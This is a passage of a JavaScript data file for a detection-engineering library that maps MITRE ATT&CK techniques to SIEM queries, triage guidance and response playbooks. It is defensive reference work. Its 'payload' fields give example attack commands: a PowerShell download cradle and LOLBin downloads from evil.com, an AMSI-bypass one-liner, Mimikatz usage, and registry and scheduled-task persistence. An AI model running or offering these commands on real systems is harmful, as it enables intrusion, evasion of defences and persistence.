        falsePositive:['User traveling (verify with travel request/expense system)','VPN split-tunnel showing dual locations','Cloud service proxy causing geolocation mismatch','Mobile network carrier GeoIP inaccuracy','User on corporate VPN from home in different region'],
        tpIndicators:'Physically impossible travel time, login from sanctioned country, immediate access to sensitive data, no travel history, MFA bypass, login from Tor/anonymizer',
        fpIndicators:'Active travel request on file, VPN in use explaining dual location, mobile carrier GeoIP known inaccuracy, user recently relocated',
        investigationSteps:'1. Check travel/expense system for user travel\n2. Verify if VPN could explain dual location\n3. Check if MFA was properly completed\n4. Review what was accessed after the suspicious login\n5. Contact user to verify activity\n6. Check for password reset or MFA changes'
    },
    soarAutomation:{
        autoActions:['GeoIP lookup both login locations','Calculate physical travel time between locations','Check HR travel system for user travel','Check if VPN is in use','Send Slack/Teams notification to user for verification'],
        conditionalActions:['IF impossible travel confirmed AND no travel on file → Lock account + require re-verification','IF user confirms NOT them → Immediate password reset + revoke sessions + investigate','IF sensitive data accessed → Escalate to data breach team','IF MFA bypass detected → Investigate MFA compromise'],
        playbookFlow:'1. Detect impossible travel → 2. Auto-check travel records → 3. Ask user to verify → 4. If unauthorized: lock + reset + hunt → 5. If authorized: dismiss + whitelist'
    },
    playbook:{
        detection:'Correlate successful login GeoIP data to identify physically impossible travel. Also monitor for MFA fatigue attacks and anomalous access patterns.',
        containment:'1. Immediately lock the user account\n2. Revoke all active sessions and tokens\n3. Block the suspicious IP\n4. Contact user through verified channel\n5. Enable additional MFA requirements',
        eradication:'1. Force password reset\n2. Re-register MFA devices\n3. Review all activity during compromise window\n4. Check for email forwarding rules\n5. Review OAuth app grants\n6. Check for data exfiltration',
        recovery:'1. Restore account access after identity verification\n2. Enable number matching for MFA push\n3. Review and revoke suspicious OAuth consents\n4. Monitor account for 30 days\n5. Implement conditional access policies'
    },
    policy:'Identity Security: Implement risk-based conditional access. Enable impossible travel detection. Require phishing-resistant MFA (FIDO2). Enable number matching for push MFA. Block legacy authentication protocols.',
    payload:`# How attackers use stolen credentials:
# Credential phishing → capture username + password + MFA token
# Token theft via adversary-in-the-middle (AiTM) proxy (Evilginx2)
# MFA fatigue: push spam until user approves
# SIM swapping to intercept SMS MFA codes
# Session cookie theft from browser (pass-the-cookie)`,
    useCases:['Detect impossible travel logins','Identify MFA fatigue attacks','Monitor for compromised credential usage','Alert on logins from sanctioned countries','Detect OAuth token abuse','Monitor for AiTM phishing attacks'],
    references:['MITRE ATT&CK T1078','Microsoft Identity Protection','CISA MFA Guidance']
},
{
    id:'IA-005',name:'Drive-by Compromise / Watering Hole',category:'Initial Access',
    mitre:{tactic:'TA0001',technique:'T1189',name:'Drive-by Compromise'},
    severity:'High',framework:'Enterprise',
    dataSources:['Proxy Logs','DNS Logs','EDR Telemetry','Browser Logs'],
    description:'Detects drive-by compromise attacks where users are redirected to exploit kits or malicious JavaScript through compromised legitimate websites (watering holes) or malvertising.',
    queries:{
        splunk:`index=proxy
| where match(url,"(?i)(exploit|kit|landing|gate|redirect|inject)")
| OR (http_content_type="text/html" AND bytes_out > 500000)
| stats count by src_ip, url, http_referrer, user_agent
| where count >= 1
| eval Suspicious=if(match(http_referrer,"(?i)(wordpress|joomla|drupal)") AND match(url,"(?i)(eval|document\\.write|fromCharCode)"),"Watering Hole","Drive-by")`,
        sentinel:`CommonSecurityLog
| where DeviceAction == "Allowed"
| where RequestURL matches regex @"(?i)(exploit|kit|landing|gate|redirect)"
| summarize count() by SourceIP, RequestURL, RequestContext`,
        qradar:`SELECT sourceip, UTF8(payload) as URL FROM events WHERE LOGSOURCETYPENAME(logsourceid) LIKE '%Proxy%' AND (UTF8(payload) ILIKE '%exploit%' OR UTF8(payload) ILIKE '%kit%' OR UTF8(payload) ILIKE '%landing%') LAST 1 HOURS`,
        elastic:`url.path:(*exploit* or *kit* or *landing* or *gate*) and http.response.status_code:200`,
        wazuh:`<rule id="100240" level="12"><if_sid>31100</if_sid><url>exploit|kit|landing|gate</url><description>Drive-by compromise: Exploit kit URL detected</description><mitre><id>T1189</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=DnsRequest | where DomainName MATCHES ".*exploit.*|.*kit.*|.*malware.*"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=HTTP AND action_url~="exploit|kit|landing"`,
        sentinelone:`EventType="DNS" AND DNS CONTAINS "exploit" OR DNS CONTAINS "kit" OR DNS CONTAINS "landing"`
    },
    tpAnalysis:{
        truePositive:['Redirect chain: legitimate site → malicious landing → exploit kit → payload','Browser exploit triggering unexpected child process (cmd, powershell)','JavaScript obfuscation in page source','Known exploit kit patterns (Rig, Fallout, Purple Fox)','Flash/Java/Browser exploit CVE in request'],
        falsePositive:['Security researcher browsing known malicious sites','Threat intel platform fetching malicious URLs','Security awareness training simulations','URL categorization services scanning sites'],
        tpIndicators:'Multi-stage redirect chain, browser spawning cmd/powershell, known exploit kit domain, obfuscated JavaScript, unexpected file download',
        fpIndicators:'Source is security tool/scanner, URL in threat intel research context, security training simulation',
        investigationSteps:'1. Trace redirect chain from initial URL\n2. Check if browser spawned suspicious child processes\n3. Analyze JavaScript for exploit code\n4. Check endpoint for payload delivery\n5. Identify the compromised legitimate website'
    },
    soarAutomation:{
        autoActions:['Check URL against threat intel','Analyze redirect chain','Check endpoint for post-exploitation','Block malicious domain at proxy/DNS'],
        conditionalActions:['IF exploit successful (browser spawns child process) → Isolate endpoint','IF watering hole confirmed → Alert all users who visited the site','IF known exploit kit → Block all associated domains'],
        playbookFlow:'1. Detect suspicious URL → 2. Trace redirects → 3. Check endpoint → 4. Block domains → 5. Hunt for other victims'
    },
    playbook:{
        detection:'Proxy logs show redirect chains to suspicious domains. EDR detects browser spawning unexpected child processes.',
        containment:'1. Block malicious domains at proxy/DNS\n2. Isolate endpoints that visited the site\n3. Kill browser processes\n4. Check for payload delivery',
        eradication:'1. Identify the compromised website\n2. Notify website owner\n3. Remove malware from endpoints\n4. Block all IOCs',
        recovery:'1. Re-image affected endpoints\n2. Update browser and plugins\n3. Enable browser isolation\n4. Implement URL filtering'
    },
    policy:'Web Security: Deploy browser isolation for uncategorized sites. Keep browsers updated. Disable unnecessary plugins (Flash, Java). Implement URL filtering. Enable content inspection at proxy.',
    payload:`# Watering hole attack chain:
1. Attacker compromises legitimate site (e.g., industry news)
2. Injects malicious JavaScript iframe/redirect
3. Visitor redirected to exploit kit landing page
4. Exploit kit checks browser/plugin versions
5. Delivers exploit for vulnerable component
6. Drops and executes malware payload`,
    useCases:['Detect exploit kit landing page access','Monitor for browser-based exploits','Alert on suspicious redirect chains','Identify watering hole attacks','Detect malvertising campaigns'],
    references:['MITRE ATT&CK T1189','SANS Exploit Kit Analysis','Google Safe Browsing']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// EXECUTION (TA0002)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'EX-001',name:'Malicious PowerShell Execution',category:'Execution',
    mitre:{tactic:'TA0002',technique:'T1059.001',name:'PowerShell'},
    severity:'High',framework:'Enterprise',
    dataSources:['PowerShell Logs (4104)','Sysmon (Event 1)','EDR Telemetry'],
    description:'Detects suspicious PowerShell execution: encoded commands, download cradles, AMSI bypass, offensive tools, reflection-based loading, and obfuscated scripts.',
    queries:{
        splunk:`index=wineventlog (EventCode=4104 OR EventCode=4103)
| eval suspicious=case(
    match(ScriptBlockText,"(?i)(IEX|Invoke-Expression|Invoke-WebRequest|DownloadString|DownloadFile|Net\\.WebClient)"),"Download Cradle",
    match(ScriptBlockText,"(?i)(EncodedCommand|FromBase64|Convert.*Base64|-enc\\s|-e\\s)"),"Encoded Execution",
    match(ScriptBlockText,"(?i)(AmsiUtils|amsiInitFailed|Bypass|Disable-Amsi)"),"AMSI Bypass",
    match(ScriptBlockText,"(?i)(Invoke-Mimikatz|Invoke-Kerberoast|SharpHound|Rubeus|Invoke-BloodHound)"),"Offensive Tool",
    match(ScriptBlockText,"(?i)(New-Object.*IO\\.MemoryStream|IO\\.Compression|Reflection\\.Assembly)"),"In-Memory Loading",
    match(ScriptBlockText,"(?i)(Start-Process|Invoke-Command|Enter-PSSession)"),"Remote Execution",
    1=1,null())
| where isnotnull(suspicious)
| stats count by Computer, UserName, suspicious`,
        sentinel:`DeviceProcessEvents
| where FileName =~ "powershell.exe" or FileName =~ "pwsh.exe"
| where ProcessCommandLine matches regex @"(?i)(IEX|Invoke-Expression|DownloadString|EncodedCommand|-enc\\s|FromBase64|AmsiUtils|Invoke-Mimikatz|MemoryStream)"
| extend ThreatType=case(ProcessCommandLine matches regex @"(?i)DownloadString","Download Cradle",ProcessCommandLine matches regex @"(?i)EncodedCommand","Encoded",ProcessCommandLine matches regex @"(?i)AmsiUtils","AMSI Bypass",true,"Suspicious PS")`,
        qradar:`SELECT sourceip, username, UTF8(payload) as CommandLine FROM events WHERE QIDNAME(qid) ILIKE '%PowerShell%' AND (UTF8(payload) ILIKE '%Invoke-Expression%' OR UTF8(payload) ILIKE '%EncodedCommand%' OR UTF8(payload) ILIKE '%DownloadString%' OR UTF8(payload) ILIKE '%AmsiUtils%') LAST 24 HOURS`,
        elastic:`process.name:("powershell.exe" or "pwsh.exe") and process.command_line:(*IEX* or *Invoke-Expression* or *DownloadString* or *EncodedCommand* or *AmsiUtils* or *Invoke-Mimikatz*)`,
        wazuh:`<rule id="100301" level="12"><if_sid>61600</if_sid><field name="win.eventdata.scriptBlockText">Invoke-Expression|IEX|DownloadString|EncodedCommand|AmsiUtils|Invoke-Mimikatz</field><description>Suspicious PowerShell execution detected</description><mitre><id>T1059.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where FileName IN ("powershell.exe","pwsh.exe") AND CommandLine MATCHES ".*(IEX|DownloadString|EncodedCommand|AmsiUtils).*"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=PROCESS AND action_process_image_name IN ("powershell.exe","pwsh.exe") AND action_process_command_line~="IEX|DownloadString|EncodedCommand|AmsiUtils"`,
        sentinelone:`SrcProcName IN ("powershell.exe","pwsh.exe") AND CmdLine MATCHES ".*(IEX|DownloadString|EncodedCommand|AmsiUtils).*"`
    },
    tpAnalysis:{
        truePositive:['Base64-decoded content contains shellcode or malware','Download cradle fetches executable from unknown external domain','AMSI bypass followed by offensive tool execution','PowerShell spawned by unusual parent (winword.exe, excel.exe, mshta.exe)','Script contains known offensive framework signatures','Connection to external C2 after execution'],
        falsePositive:['SCCM/Intune software deployment scripts','IT admin automation (DSC, Azure Automation)','Software update mechanisms using PowerShell','Security tools performing authorized scans','Developer running legitimate build scripts','VS Code integrated terminal operations'],
        tpIndicators:'External URL download, base64 encoded payload, AMSI bypass before execution, offensive tool strings, unusual parent process, connection to C2 after execution',
        fpIndicators:'Script signed by trusted publisher, executed from SCCM/Intune, matches known admin automation, no external network calls, scheduled admin task',
        investigationSteps:'1. Decode any base64 content to see actual payload\n2. Check parent process (how was PS launched)\n3. Verify if script downloaded anything externally\n4. Check for lateral movement after execution\n5. Compare against known admin scripts baseline\n6. Check if AMSI bypass was attempted'
    },
    soarAutomation:{
        autoActions:['Decode base64 encoded commands','Check any downloaded URLs against threat intel','Hash the script and check VirusTotal','Query script block logging for full script content','Check parent process chain'],
        conditionalActions:['IF download from external domain → Block domain + isolate endpoint','IF AMSI bypass + offensive tool → Isolate immediately + Tier 3 escalation','IF base64 contains shellcode → Critical alert + full IR activation','IF from admin workstation with valid context → Reduce severity to Info'],
        playbookFlow:'1. Capture script content → 2. Decode obfuscation → 3. Classify threat type → 4. Auto-respond based on severity → 5. Hunt across environment → 6. Report'
    },
    playbook:{
        detection:'Script Block Logging (4104) captures deobfuscated content. Focus on download cradles, encoded commands, AMSI bypass, and offensive tool signatures.',
        containment:'1. Isolate endpoint\n2. Kill PowerShell and child processes\n3. Block outbound C2 connections\n4. Disable compromised account\n5. Capture memory dump',
        eradication:'1. Analyze full script content\n2. Decode base64 payloads\n3. Identify downloaded malware\n4. Check for persistence mechanisms\n5. Hunt for same script across all endpoints',
        recovery:'1. Re-image if advanced malware found\n2. Enable Constrained Language Mode\n3. Implement Script Block Logging\n4. Block PowerShell v2\n5. Deploy AppLocker/WDAC restrictions'
    },
    policy:'PowerShell Security: Enable Script Block Logging + Module Logging. Deploy Constrained Language Mode for standard users. Block PS v2. Implement AMSI. Restrict PS via AppLocker.',
    payload:`# Download Cradle:
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
powershell -enc SQBFAFgA...  # Base64 encoded

# AMSI Bypass:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# In-Memory Loading:
$bytes=[System.Convert]::FromBase64String($encoded)
[System.Reflection.Assembly]::Load($bytes)

# Offensive Tools:
Invoke-Mimikatz -DumpCreds
Invoke-Kerberoast -OutputFormat Hashcat`,
    useCases:['Detect fileless malware via PS cradles','Identify encoded command execution','Alert on AMSI bypass attempts','Monitor offensive tool usage','Detect PS-based lateral movement','Catch in-memory .NET assembly loading'],
    references:['MITRE ATT&CK T1059.001','Microsoft PS Security','SANS PS Logging Cheat Sheet']
},
{
    id:'EX-002',name:'Suspicious Process Execution (LOLBins)',category:'Execution',
    mitre:{tactic:'TA0002',technique:'T1218',name:'System Binary Proxy Execution'},
    severity:'High',framework:'Enterprise',
    dataSources:['Sysmon (Event 1)','EDR Telemetry','Windows Security Logs'],
    description:'Detects Living-off-the-Land Binary (LOLBin) abuse where attackers use legitimate Windows binaries (mshta, certutil, rundll32, regsvr32, msiexec, etc.) to execute malicious payloads while evading detection.',
    queries:{
        splunk:`index=sysmon EventCode=1
| eval lolbin=case(
    match(Image,"(?i)mshta\\.exe") AND match(CommandLine,"(?i)(http|javascript|vbscript)"),"MSHTA Web/Script",
    match(Image,"(?i)certutil\\.exe") AND match(CommandLine,"(?i)(urlcache|decode|encode)"),"CertUtil Download/Decode",
    match(Image,"(?i)rundll32\\.exe") AND match(CommandLine,"(?i)(javascript|http|shell32|comsvcs)"),"RunDLL32 Abuse",
    match(Image,"(?i)regsvr32\\.exe") AND match(CommandLine,"(?i)(/s|/i:http|scrobj)"),"RegSvr32 Squiblydoo",
    match(Image,"(?i)msiexec\\.exe") AND match(CommandLine,"(?i)(/q.*http|/q.*\\\\\\\\)"),"MSIExec Remote Install",
    match(Image,"(?i)cmstp\\.exe") AND match(CommandLine,"(?i)(/s|/ni)"),"CMSTP Bypass",
    match(Image,"(?i)wmic\\.exe") AND match(CommandLine,"(?i)(process.*call.*create|/format)"),"WMIC Execution",
    match(Image,"(?i)bitsadmin\\.exe") AND match(CommandLine,"(?i)(transfer|download)"),"BITSAdmin Download",
    match(Image,"(?i)msdt\\.exe") AND match(CommandLine,"(?i)(ms-msdt|PCWDiagnostic)"),"MSDT Follina",
    1=1,null())
| where isnotnull(lolbin)
| stats count by Computer, User, lolbin, CommandLine`,
        sentinel:`DeviceProcessEvents
| where FileName in~ ("mshta.exe","certutil.exe","rundll32.exe","regsvr32.exe","msiexec.exe","cmstp.exe","wmic.exe","bitsadmin.exe","msdt.exe")
| where ProcessCommandLine matches regex @"(?i)(http|javascript|urlcache|decode|scrobj|/format|transfer|ms-msdt)"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE "EventID"=1 AND (UTF8(payload) ILIKE '%mshta%http%' OR UTF8(payload) ILIKE '%certutil%urlcache%' OR UTF8(payload) ILIKE '%rundll32%javascript%' OR UTF8(payload) ILIKE '%regsvr32%scrobj%') LAST 24 HOURS`,
        elastic:`process.name:("mshta.exe" or "certutil.exe" or "rundll32.exe" or "regsvr32.exe" or "msiexec.exe" or "bitsadmin.exe") and process.command_line:(*http* or *urlcache* or *decode* or *javascript* or *scrobj*)`,
        wazuh:`<rule id="100310" level="12"><if_sid>61603</if_sid><field name="win.eventdata.image">mshta|certutil|rundll32|regsvr32|bitsadmin</field><field name="win.eventdata.commandLine">http|urlcache|decode|javascript|scrobj</field><description>LOLBin abuse detected</description><mitre><id>T1218</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where FileName IN ("mshta.exe","certutil.exe","rundll32.exe","regsvr32.exe","bitsadmin.exe") AND CommandLine MATCHES ".*(http|urlcache|decode|javascript|scrobj).*"`,
        cortex_xdr:`dataset=xdr_data | filter action_process_image_name IN ("mshta.exe","certutil.exe","rundll32.exe","regsvr32.exe","bitsadmin.exe") AND action_process_command_line~="http|urlcache|decode|javascript|scrobj"`,
        sentinelone:`SrcProcName IN ("mshta.exe","certutil.exe","rundll32.exe","regsvr32.exe","bitsadmin.exe") AND CmdLine MATCHES ".*(http|urlcache|decode|javascript|scrobj).*"`
    },
    tpAnalysis:{
        truePositive:['LOLBin downloading from external/unknown URL','CertUtil decoding base64 executable on disk','MSHTA executing remote HTA file from internet','RegSvr32 loading scriptlet from external URL (Squiblydoo)','BITSAdmin transferring executable from external source','Unusual parent process for the LOLBin (e.g., Word → mshta)'],
        falsePositive:['IT admin using certutil for certificate management','Legitimate software installation via msiexec','BITSAdmin used by Windows Update','WMIC for system management queries','Software developers using regsvr32 for COM registration'],
        tpIndicators:'External URL in command line, unusual parent process, base64 decoding to temp directory, scriptlet loading from internet, execution from user-writable directory',
        fpIndicators:'Internal URL/file path, IT admin context, Windows Update activity, known software installation, scheduled maintenance task',
        investigationSteps:'1. Check the URL/file being accessed\n2. Identify parent process chain\n3. Check if file was downloaded/decoded\n4. Analyze the downloaded payload\n5. Look for persistence after LOLBin execution\n6. Check for C2 callbacks'
    },
    soarAutomation:{
        autoActions:['Extract URLs from command line','Check URLs against threat intel','Submit downloaded files to sandbox','Map parent process chain','Check if LOLBin execution is in known-good baseline'],
        conditionalActions:['IF external URL in command → Block URL + investigate endpoint','IF decoded file is executable → Quarantine + scan','IF unusual parent (Office app) → Likely exploit, isolate immediately','IF matches LOLBAS pattern exactly → High confidence malicious'],
        playbookFlow:'1. Detect LOLBin abuse → 2. Extract IOCs → 3. Check against LOLBAS database → 4. Enrich + assess → 5. Block + contain → 6. Hunt for lateral movement'
    },
    playbook:{
        detection:'Sysmon Event 1 captures LOLBin execution with full command line. Focus on unusual command line arguments, external URLs, and unexpected parent processes.',
        containment:'1. Kill the LOLBin process\n2. Block any external URLs accessed\n3. Quarantine downloaded files\n4. Isolate endpoint if exploit chain detected\n5. Check for persistence',
        eradication:'1. Remove downloaded payloads\n2. Delete any persistence mechanisms\n3. Block LOLBin abuse via WDAC rules\n4. Hunt for same pattern across environment',
        recovery:'1. Implement WDAC/AppLocker rules for LOLBins\n2. Block unnecessary LOLBins via policy\n3. Enable enhanced logging for system binaries\n4. Train SOC on LOLBAS techniques'
    },
    policy:'Endpoint Hardening: Block unnecessary LOLBins via AppLocker/WDAC. Monitor all LOLBin executions. Restrict internet access for system binaries. Enable command line auditing.',
    payload:`# CertUtil download: certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe
# MSHTA: mshta http://evil.com/payload.hta
# RegSvr32 Squiblydoo: regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll
# RunDLL32: rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";document.write(GetObject("script:http://evil.com/payload.sct"))
# BITSAdmin: bitsadmin /transfer job http://evil.com/payload.exe C:\\temp\\payload.exe
# MSIExec: msiexec /q /i http://evil.com/malicious.msi`,
    useCases:['Detect LOLBin abuse for payload delivery','Monitor certutil file download/decode','Alert on MSHTA remote HTA execution','Detect Squiblydoo (regsvr32 scriptlet)','Monitor BITSAdmin file transfers','Catch WMIC remote process creation'],
    references:['MITRE ATT&CK T1218','LOLBAS Project','SANS LOLBins Cheat Sheet']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// PERSISTENCE (TA0003)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'PE-001',name:'Registry Run Key Persistence',category:'Persistence',
    mitre:{tactic:'TA0003',technique:'T1547.001',name:'Registry Run Keys / Startup Folder'},
    severity:'High',framework:'Enterprise',
    dataSources:['Sysmon (Event 12/13/14)','EDR Telemetry','Windows Security Logs'],
    description:'Detects modifications to Registry Run/RunOnce keys or Startup folders for persistence across reboots.',
    queries:{
        splunk:`index=sysmon (EventCode=12 OR EventCode=13 OR EventCode=14) | where match(TargetObject,"(?i)(Run|RunOnce|RunServices|Explorer\\\\Shell Folders|Winlogon)") | where NOT match(Image,"(?i)(svchost|msiexec|setup|install|update)") | stats count by Computer, User, Image, TargetObject, Details`,
        sentinel:`DeviceRegistryEvents | where RegistryKey matches regex @"(?i)(Run|RunOnce|Winlogon)" | where ActionType=="RegistryValueSet" | where InitiatingProcessFileName !in~ ("svchost.exe","msiexec.exe")`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE "EventID" IN (12,13,14) AND (UTF8(payload) ILIKE '%\\Run\\%' OR UTF8(payload) ILIKE '%\\RunOnce\\%') LAST 24 HOURS`,
        elastic:`event.code:("12" or "13" or "14") and registry.path:(*\\\\Run\\* or *\\\\RunOnce\\* or *Winlogon*)`,
        wazuh:`<rule id="100401" level="10"><if_sid>61614</if_sid><field name="win.eventdata.targetObject">\\\\Run\\\\|\\\\RunOnce\\\\|\\\\Winlogon</field><description>Registry Run key persistence detected</description><mitre><id>T1547.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=AsepValueUpdate | where AsepClass="RunKey" AND NOT (ImageFileName IN ("svchost.exe","msiexec.exe"))`,
        cortex_xdr:`dataset=xdr_data | filter event_type=REGISTRY AND action_registry_key_name~="Run|RunOnce" AND action_registry_value_name!=""`,
        sentinelone:`EventType="Registry" AND RegistryPath CONTAINS "\\Run\\" AND NOT SrcProcName IN ("svchost.exe","msiexec.exe")`
    },
    tpAnalysis:{
        truePositive:['Run key value points to file in temp/user-writable directory','Registry modified by non-standard process (cmd, powershell, unknown exe)','Value data contains encoded/obfuscated command','Winlogon Shell modified to include additional binary','Run key added immediately after initial compromise indicators'],
        falsePositive:['Software installation adding startup entries','Windows Updates modifying Run keys','IT management tools (SCCM, GPO)','Legitimate apps configuring auto-start'],
        tpIndicators:'Value pointing to temp/Downloads directory, non-installer process writing Run key, obfuscated value data, multiple Run keys added in rapid succession',
        fpIndicators:'Installer process (msiexec, setup.exe), GPO-pushed value, known software vendor, value points to Program Files directory',
        investigationSteps:'1. Check the process that modified the registry\n2. Verify the executable referenced in the Run key value\n3. Submit the referenced file to sandbox\n4. Check if this is a known software installation\n5. Look for other persistence mechanisms on same endpoint'
    },
    soarAutomation:{
        autoActions:['Extract file path from registry value data','Hash the referenced executable','Submit hash to VirusTotal','Check process tree that created the key','Compare against known-good baseline'],
        conditionalActions:['IF file path in temp directory → High priority investigation','IF file hash is malicious → Auto-remove registry key + quarantine file','IF created by PowerShell/cmd → Escalate to analyst','IF matches known software → Auto-close as benign'],
        playbookFlow:'1. Detect Run key modification → 2. Extract & hash referenced file → 3. Check VT + baseline → 4. If malicious: remove key + quarantine → 5. Hunt for more persistence'
    },
    playbook:{
        detection:'Sysmon Events 12-14 capture registry modifications. Filter on Run/RunOnce paths and identify the modifying process.',
        containment:'1. Remove the malicious registry entry\n2. Kill the process referenced in the Run key\n3. Isolate endpoint if malware confirmed\n4. Quarantine the payload file',
        eradication:'1. Delete malicious registry value\n2. Remove payload from disk\n3. Check for additional persistence\n4. Search for same pattern across all endpoints',
        recovery:'1. Verify all malicious entries removed\n2. Reboot and confirm persistence cleared\n3. Run full antimalware scan\n4. Baseline legitimate Run key entries'
    },
    policy:'Endpoint Hardening: Monitor all Run key modifications. Maintain baseline of legitimate autostart entries. Implement application whitelisting. Restrict Run key modifications for standard users via GPO.',
    payload:`# Registry persistence:
reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Users\\Public\\malware.exe"
# PowerShell:
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SecurityUpdate" -Value "powershell -windowstyle hidden -file C:\\temp\\beacon.ps1"
# Startup folder:
copy malware.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"`,
    useCases:['Detect malware establishing boot persistence','Monitor unauthorized autostart entries','Identify fileless PS persistence','Alert on Winlogon Shell modification','Track startup folder modifications'],
    references:['MITRE ATT&CK T1547.001','Microsoft Autoruns','SANS Forensics Poster']
},
{
    id:'PE-002',name:'Scheduled Task Persistence',category:'Persistence',
    mitre:{tactic:'TA0003',technique:'T1053.005',name:'Scheduled Task'},
    severity:'Medium',framework:'Enterprise',
    dataSources:['Windows Security Logs (4698)','Sysmon','Task Scheduler Logs'],
    description:'Detects scheduled task creation for persistence, execution, or privilege escalation.',
    queries:{
        splunk:`index=wineventlog EventCode=4698 | rex field=TaskContent "<Command>(?<TaskCmd>[^<]+)</Command>" | rex field=TaskContent "<Arguments>(?<TaskArgs>[^<]+)</Arguments>" | where match(TaskCmd,"(?i)(powershell|cmd|mshta|wscript|cscript|rundll32|regsvr32)") OR match(TaskArgs,"(?i)(http|base64|-enc|\\\\\\\\)") | table _time, Computer, SubjectUserName, TaskName, TaskCmd, TaskArgs`,
        sentinel:`SecurityEvent | where EventID==4698 | parse EventData with * '<Command>' Command '</Command>' * | parse EventData with * '<Arguments>' Arguments '</Arguments>' * | where Command matches regex @"(?i)(powershell|cmd|mshta|wscript|cscript|rundll32)"`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE "EventID"=4698 AND (UTF8(payload) ILIKE '%powershell%' OR UTF8(payload) ILIKE '%cmd.exe%' OR UTF8(payload) ILIKE '%mshta%') LAST 24 HOURS`,
        elastic:`event.code:"4698" and winlog.event_data.TaskContent:(*powershell* or *cmd* or *mshta* or *rundll32*)`,
        wazuh:`<rule id="100410" level="10"><if_sid>18566</if_sid><field name="win.eventdata.taskContent">powershell|cmd\\.exe|mshta|rundll32</field><description>Suspicious scheduled task created</description><mitre><id>T1053.005</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ScheduledTaskRegistered | where TaskExecCommand MATCHES ".*(powershell|cmd|mshta|rundll32).*"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=TASK_SCHEDULER AND action_task_action~="powershell|cmd|mshta|rundll32"`,
        sentinelone:`EventType="Task" AND TaskAction MATCHES ".*(powershell|cmd|mshta|rundll32).*"`
    },
    tpAnalysis:{
        truePositive:['Task runs script interpreter with encoded/obfuscated commands','Task executable path is in temp/user-writable directory','Task runs as SYSTEM but created by non-admin user','Task triggers on logon/boot with suspicious command','Task created immediately after initial compromise'],
        falsePositive:['Windows Update scheduled tasks','Software update tasks (Adobe, Chrome)','IT admin maintenance scripts','Backup software scheduled jobs'],
        tpIndicators:'Executable in temp directory, runs as SYSTEM, encoded command arguments, created by script interpreter, unusual task name',
        fpIndicators:'Known software vendor task, scheduled during business hours by admin, matches standard task naming convention',
        investigationSteps:'1. Examine the task command and arguments\n2. Check who created the task\n3. Verify the executable referenced\n4. Check task trigger conditions\n5. Compare against known-good task baseline'
    },
    soarAutomation:{
        autoActions:['Extract task command and arguments','Hash the executable','Check against task baseline','Verify creator account privileges'],
        conditionalActions:['IF executable in temp path → High priority alert','IF runs as SYSTEM and non-admin created → Critical alert + disable task','IF encoded commands in arguments → Investigate + decode','IF matches known software → Auto-close'],
        playbookFlow:'1. Detect task creation → 2. Extract and analyze → 3. Compare to baseline → 4. If suspicious: disable + investigate → 5. Remove if malicious'
    },
    playbook:{
        detection:'Event 4698 logs task creation with full XML content. Focus on tasks running script interpreters.',
        containment:'1. Disable suspicious task immediately\n2. Kill running instances\n3. Quarantine the executable\n4. Check if task runs with elevated privileges',
        eradication:'1. Delete the task\n2. Remove the payload\n3. Check for other tasks by same creator\n4. Search environment-wide',
        recovery:'1. Audit all tasks against baseline\n2. Restrict task creation to admins\n3. Enable task creation auditing\n4. Document authorized tasks in CMDB'
    },
    policy:'Task Scheduling: Enable 4698/4699/4700/4701 auditing. Restrict creation to admins. Maintain authorized task inventory. Alert on tasks running script interpreters.',
    payload:`# Scheduled task persistence:
schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -file C:\\temp\\beacon.ps1" /sc onlogon /ru SYSTEM
# PowerShell:
Register-ScheduledTask -TaskName "SystemHealthCheck" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -file C:\\temp\\script.ps1") -Trigger (New-ScheduledTaskTrigger -AtLogOn) -RunLevel Highest`,
    useCases:['Detect persistent scheduled tasks','Monitor SYSTEM-level task creation','Identify tasks from temp directories','Alert on encoded command tasks','Track task modification and deletion'],
    references:['MITRE ATT&CK T1053.005','Microsoft Scheduled Task Security','CISA Analysis Report']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// PRIVILEGE ESCALATION (TA0004)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'PR-001',name:'Token Impersonation / Privilege Escalation',category:'Privilege Escalation',
    mitre:{tactic:'TA0004',technique:'T1134.001',name:'Token Impersonation/Theft'},
    severity:'Critical',framework:'Enterprise',
    dataSources:['Windows Security Logs (4672)','Sysmon','EDR Telemetry'],
    description:'Detects token manipulation and privilege escalation via tools like PrintSpoofer, JuicyPotato, GodPotato, and Mimikatz token functions.',
    queries:{
